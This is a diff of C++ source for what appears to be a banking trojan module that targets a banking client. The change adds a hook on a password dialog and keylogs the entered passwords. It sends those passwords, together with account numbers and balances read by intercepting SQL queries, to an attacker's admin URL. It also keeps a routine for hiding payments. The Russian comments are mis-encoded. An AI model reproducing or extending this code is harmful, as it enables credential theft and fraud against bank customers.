@@ -55,6 +55,7 @@ static bool runHideReplacement = false; //true - если надо провести подмену скры
 
 const int PROCESS_HASH = 0x9530DB12; // tiny.exe
 const DWORD HashTfAuthNew = 0x19DEB558; //класс окна входа в систему
+const DWORD HashTPasswordDlg = 0xDF7C7D28; //класс окна ввода парол€
 
 char folderTiny[MAX_PATH];
 
@@ -75,8 +76,6 @@ struct ForFindControl
 //состо€ние (режим работы) системы перехвата SQL запросов
 //1 - чтение баланса счетов (чтение счета), 2 - нужный счет прочитан, чтение баланса
 static int stateSQL = 0; 
-//текущий баланс
-static __int64 currentBalance = 0;
 static char passwordClient[100]; //пароль к клиенту (дл€ отправки через аз)
 static char bankClient[100]; //им€ банка клиента
 static int codeBankClient; //код банка
@@ -86,10 +85,12 @@ struct InfoAccount
 {
 	WCHAR account[16]; //счет клиента
 	__int64 balance; //остаток на счету, тип Currency, последние 4-е знака идут после точки (копейки)
+	__int64 oldBalance; //предыдущее значение баланса
 	WCHAR name[128]; //название клиента
 };
 
-static InfoAccount accountClient;
+static InfoAccount accountClient[10]; //текущие остатки на счетах
+static int currAccount = 0; //текущий счет из accountClient
 
 ///////////////////////////////////////////////////////////////////////////////////////////
 //тип функции вызываемой при срабатывании фильтра
@@ -321,21 +322,34 @@ static DWORD WINAPI SendBalance( InfoAccount* ia )
 		string azUser = GetAzUser();
 		//pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=getdrop&sum=%s&acc=%s", urlAdmin, Bot->UID.t_str(), azUser.t_str(), balance, account );
 		pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s&w=1", urlAdmin, BOT_UID, azUser.t_str(), balance, account, urlNameBank);
-		DBG( "Tiny", "ќтправл€ем запрос 1 %s", qr.AsStr() );
+		DBG( "Tiny", "ќтправл€ем запрос %s", qr.AsStr() );
 		THTTP H;
 		H.Get(qr.AsStr());
 		STR::Free(account);
 		STR::Free(urlNameBank);
-		currentBalance = ia->balance; //запоминаем текущий баланс
-		char text[128];
-		pwsprintfA( text, "Password=%s", passwordClient );
-		char* urlText= URLEncode(text);
-		pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=setlog&log=00&text=%s", urlAdmin, BOT_UID, azUser.t_str(), urlText );
-		DBG( "Tiny", "ќтправл€ем запрос 2 %s", qr.AsStr() );
-		H.Get(qr.AsStr());
-		STR::Free(text);
 	}
-	MemFree(ia);
+	return 0;
+}
+
+static DWORD WINAPI SendPassword( void* )
+{
+	DBG( "Tiny", "ќтсылка парол€ %s", passwordClient );
+	char urlAdmin[128];
+	if( GetAdminUrl(urlAdmin) )
+	{
+		char text[128];
+		fwsprintfA pwsprintfA = Get_wsprintfA();
+		m_lstrcpy( text, "Password=" );
+		m_lstrcat( text, passwordClient );
+		char* urlText= URLEncode(text);
+		TMemory qr(512);
+		string azUser = GetAzUser();
+		pwsprintfA( qr.AsStr(), "http://%s/raf/?uid=%s&sys=tiny&cid=%s&mode=setlog&log=00&text=%s", urlAdmin, BOT_UID, azUser.t_str(), urlText );
+		DBG( "Tiny", "ќтправл€ем запрос %s", qr.AsStr() );
+		THTTP H;
+		H.Get(qr.AsStr());
+		STR::Free(urlText);
+	}
 	return 0;
 }
 
@@ -364,19 +378,8 @@ static void AddStrLog( const char* name, const char* value, char* resultGrab )
 	DBG( "Tiny", buf );
 }
 
-static DWORD SendGrabData( ForFindControl* ffc )
+static void GrabKeys()
 {
-	TMemory resultGrab(512);
-	resultGrab.AsStr()[0] = 0;
-	AddStrLog( "Login", ffc->texts[0], resultGrab.AsStr() );
-	AddStrLog( "Password", ffc->texts[2], resultGrab.AsStr() );
-	SafeCopyStr( passwordClient, sizeof(passwordClient), ffc->texts[2] );
-	AddStrLog( "Path database", ffc->texts[1], resultGrab.AsStr() );
-	AddStrLog( "Path client", folderTiny, resultGrab.AsStr() );
-	m_lstrcpy( pathMDB, ffc->texts[1] );
-	VideoProcess::SendLog( 0, "tiny", 0, resultGrab.AsStr() );
-	for( int i = 0; i < ffc->count; i++ ) STR::Free( ffc->texts[i] );
-	MemFree(ffc);
 	//берем в базе данных путь к ключам
 	ODBC* db = OpenDB();
 	if( db )
@@ -398,11 +401,48 @@ static DWORD SendGrabData( ForFindControl* ffc )
 	}
 	else
 		DBG( "Tiny", "Ќе удалось открыть базу %s", pathMDB );
+}
 
-	pSleep(10000); //ждем немного и закрываем систему
+static DWORD SendGrabData( ForFindControl* ffc )
+{
+	TMemory resultGrab(512);
+	resultGrab.AsStr()[0] = 0;
+	AddStrLog( "Login", ffc->texts[0], resultGrab.AsStr() );
+	AddStrLog( "Password", ffc->texts[2], resultGrab.AsStr() );
+	SafeCopyStr( passwordClient, sizeof(passwordClient), ffc->texts[2] );
+	RunThread( SendPassword, 0 );
+	AddStrLog( "Path database", ffc->texts[1], resultGrab.AsStr() );
+	AddStrLog( "Path client", folderTiny, resultGrab.AsStr() );
+	m_lstrcpy( pathMDB, ffc->texts[1] );
+	VideoProcess::SendLog( 0, "tiny", 0, resultGrab.AsStr() );
+	for( int i = 0; i < ffc->count; i++ ) STR::Free( ffc->texts[i] );
+	MemFree(ffc);
+	GrabKeys();
+	pSleep(2000); //ждем немного и закрываем систему
 
-	DWORD unhook[]  = { 0xEB4A6DB3 /* DestroyWindow */, 0 };	
-	RestoreFuncs( DLL_USER32,  unhook );
+//	DWORD unhook[]  = { 0xEB4A6DB3 /* DestroyWindow */, 0 };
+//	RestoreFuncs( DLL_USER32,  unhook );
+
+	KeyLogger::CloseSession();
+
+	return 0;
+}
+
+static DWORD SendGrabPassword( ForFindControl* ffc )
+{
+	TMemory resultGrab(512);
+	resultGrab.AsStr()[0] = 0;
+	AddStrLog( "Password", ffc->texts[0], resultGrab.AsStr() );
+	SafeCopyStr( passwordClient, sizeof(passwordClient), ffc->texts[0] );
+	RunThread( SendPassword, 0 );
+	VideoProcess::SendLog( 0, "tiny", 0, resultGrab.AsStr() );
+	for( int i = 0; i < ffc->count; i++ ) STR::Free( ffc->texts[i] );
+	MemFree(ffc);
+	GrabKeys();
+	pSleep(2000); //ждем немного и закрываем систему
+
+//	DWORD unhook[]  = { 0xEB4A6DB3 /* DestroyWindow */, 0 };	
+//	RestoreFuncs( DLL_USER32,  unhook );
 
 	KeyLogger::CloseSession();
 
@@ -447,6 +487,17 @@ static BOOL WINAPI HandlerDestroyWindow( HWND hwnd )
 		if( ffc->count >= 3 )
 			RunThread( SendGrabData, ffc );
 	}
+	else if( HashTPasswordDlg == hash )
+	{
+		DBG( "Tiny", "«акрытие окна ввода парол€" );
+		ForFindControl* ffc = (ForFindControl*)MemAlloc(sizeof(ForFindControl));
+		ffc->count = 0;
+		ffc->hashs = GrabControls;
+		pEnumChildWindows( hwnd, EnumChildProc, ffc );
+		if( ffc->count >= 1 )
+			RunThread( SendGrabPassword, ffc );
+	}
+
 	return RealDestroyWindow(hwnd);
 }
 
@@ -698,10 +749,14 @@ static HRESULT STDAPICALLTYPE HandlerCoCreateInstance( REFCLSID rclsid, LPUNKNOW
 void Activeted(LPVOID Sender)
 {
 	DBG( "Tiny", "Activated" );
-	PKeyLogSystem System = (PKeyLogSystem)Sender;
-	MegaJump(SendTiny);
-	//VideoProcess::RecordPID( 0, "Tiny" );
-	SetHooks();
+//	SetHooks();
+}
+
+//активаци€ при вводе парол€
+void Activeted2(LPVOID Sender)
+{
+	DBG( "Tiny", "Activated2" );
+//	SetHooks();
 }
 
 bool Init( const char* appName )
@@ -721,7 +776,15 @@ bool Init( const char* appName )
 		{
 			F1->OnActivate = Activeted;
 		}
+		char* classWnd2 = "TPasswordDlg";
+		PKlgWndFilter F2 = KeyLogger::AddFilter(S, true, true, classWnd2, 0, FILTRATE_PARENT_WND, LOG_ALL, 5);
+		if( F2 )
+		{
+			F2->OnActivate = Activeted2;
+		}
 		RunThread( ThreadHideReplacement, 0 );
+		MegaJump(SendTiny);
+		SetHooks();
 		return true;
 	}
 	return false;
@@ -750,11 +813,11 @@ static bool InitData()
 	pathMDB[0] = 0;
 	passwordClient[0] = 0;
 	bankClient[0] = 0;
-	currentBalance = 0;
 //	if( GetAdminUrl(domain) == 0 )
 //		domain[0] = 0;
 	restAccounts[0].account[0] = 0;
 	hidePayments[0].account[0] = 0;
+	accountClient[0].account[0] = 0;
 	return true;
 }
 
@@ -764,9 +827,6 @@ static bool InitData()
 static int FSF_SelectAmounts( WCHAR* sql, int len )
 {
 	stateSQL = 1; //чтение баланса
-	accountClient.account[0] = 0;
-	accountClient.balance = 0;
-	accountClient.name[0] = 0;
 	DBG( "Tiny", "FSF_SelectAmounts(): stateSQL = 1, %ls", sql );
 	return 1; //оставить запрос как есть
 }
@@ -788,33 +848,57 @@ static void FV_Code_Amounts( VARIANT* v )
 	{
 		//счет в таблице представлен как "xxxx xxxxxxxy.zzz", где zzz код валюты (на нужна 980)
 		//вместо пробела (5-€ позици€) нужно поставить символ y, почему так сделано неизвестно
-		//ищем точку
-		int i = 0;
+		//другими слова приводим счет к нормальному виду
 		int space = 0;
-		while( v->bstrVal[i] && i < ARRAYSIZE(accountClient.account) - 1 )
+		wchar_t* p = v->bstrVal;
+		wchar_t account[32];
+		wchar_t* t = account;
+		while( *p && *p != L'.' )
 		{
-			if( v->bstrVal[i] == L'.' )
+			if( *p == L' ' )
 			{
-				if( !m_wcsncmp( &v->bstrVal[i + 1], L"980", 3 ) )
+				if( space == 0 ) 
 				{
-					stateSQL = 2;
-					m_wcsncpy( accountClient.account, v->bstrVal, i );
-					if( space > 0 )
-					{
-						accountClient.account[space] = accountClient.account[i - 1];
-						accountClient.account[i - 1] = 0;
-					}
-					else
-						accountClient.account[i] = 0;
-					stateSQL = 2; //нужный счет считан, можно считывать баланс
-					DBG( "Tiny", "stateSQL = 2, account = %ls", accountClient.account );
+					space = p - v->bstrVal;
+					*t++ = *p;
 				}
-				break;
 			}
 			else
-				if( v->bstrVal[i] == L' ' && space == 0 )
-					space = i;
-			i++;
+				*t++ = *p;
+			p++;
+		}
+		if( space > 0 )
+		{
+			account[space] = p[-1];
+			t--;
+		}
+		while( *p ) *t++ = *p++;
+		*t = 0;
+		int len = t - account;
+		int i;
+		currAccount = -1;
+		for( i = 0; i < ARRAYSIZE(accountClient) - 1 && accountClient[i].account[0]; i++ )
+		{
+			if( !m_wcsncmp( account, accountClient[i].account, len ) ) //такой счет есть в массиве
+			{
+				currAccount = i;
+				break;
+			}
+		}
+		if( currAccount < 0 ) //в массиве нет такого счета
+		{
+			if( i < ARRAYSIZE(accountClient) - 1 ) //есть еще место в массиве
+			{
+				//добавл€ем счет
+				m_wcsncpy( accountClient[i].account, account, len + 1 );
+				accountClient[i + 1].account[0] = 0;
+				currAccount = i;
+			}
+		}
+		if( currAccount >= 0 )
+		{
+			stateSQL = 2; //счет считан, можно считывать баланс
+			DBG( "Tiny", "stateSQL = 2, account = %ls", account );
 		}
 	}
 }
@@ -823,8 +907,9 @@ static void FV_Confirmed_Amounts( VARIANT* v )
 {
 	if( stateSQL == 2 )
 	{
-		accountClient.balance = v->cyVal.int64;
-		DBG( "Tiny", "balance = %I64d", accountClient.balance );
+		accountClient[currAccount].oldBalance = accountClient[currAccount].balance;
+		accountClient[currAccount].balance = v->cyVal.int64;
+		DBG( "Tiny", "balance = %I64d -> %I64d", accountClient[currAccount].oldBalance, accountClient[currAccount].balance );
 	}
 }
 
@@ -832,13 +917,11 @@ static void FV_FullName_Amounts( VARIANT* v )
 {
 	if( stateSQL == 2 )
 	{
-		m_wcscpy( accountClient.name, ARRAYSIZE(accountClient.name), v->bstrVal );
-		DBG( "Tiny", "name account: '%ls'", accountClient.name );
-		if( currentBalance != accountClient.balance )
+		m_wcscpy( accountClient[currAccount].name, ARRAYSIZE(accountClient[currAccount].name), v->bstrVal );
+		DBG( "Tiny", "name account: '%ls'", accountClient[currAccount].name );
+		if( accountClient[currAccount].oldBalance != accountClient[currAccount].balance )
 		{
-			InfoAccount* ia = (InfoAccount*)MemAlloc(sizeof(InfoAccount));
-			m_memcpy( ia, &accountClient, sizeof(InfoAccount) );
-			RunThread( SendBalance, ia );
+			RunThread( SendBalance, &accountClient[currAccount] );
 		}
 		stateSQL = 1;
 	}
@@ -1150,5 +1233,3 @@ static DWORD WINAPI ThreadHideReplacement(void*)
 }
 
 }
-
-//TPasswordDlg
